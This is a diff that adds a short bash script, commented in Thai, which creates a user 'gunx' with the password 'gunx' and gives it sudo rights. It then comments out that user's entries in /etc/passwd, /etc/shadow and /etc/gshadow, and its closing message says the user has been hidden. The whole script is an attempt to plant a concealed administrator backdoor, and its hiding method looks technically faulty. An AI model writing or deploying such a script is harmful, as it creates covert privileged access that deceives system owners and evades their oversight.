@@ -1,0 +1,17 @@
+#!/bin/bash
+
+# สร้างผู้ใช้งาน gunx
+sudo adduser gunx
+echo "gunx:gunx" | chpasswd
+usermod -aG sudo gunx
+
+# ซ่อนผู้ใช้งาน gunx ในไฟล์ /etc/passwd
+sudo sed -i 's/^gunx:/#&/' /etc/passwd
+
+# ซ่อนผู้ใช้งาน gunx ในไฟล์ /etc/shadow
+sudo sed -i 's/^gunx:/#&/' /etc/shadow
+
+# ซ่อนผู้ใช้งาน gunx ในไฟล์ /etc/gshadow
+sudo sed -i 's/^gunx:/#&/' /etc/gshadow
+
+echo "สร้างผู้ใช้งาน: gunx และซ่อนผู้ใช้งานนี้"
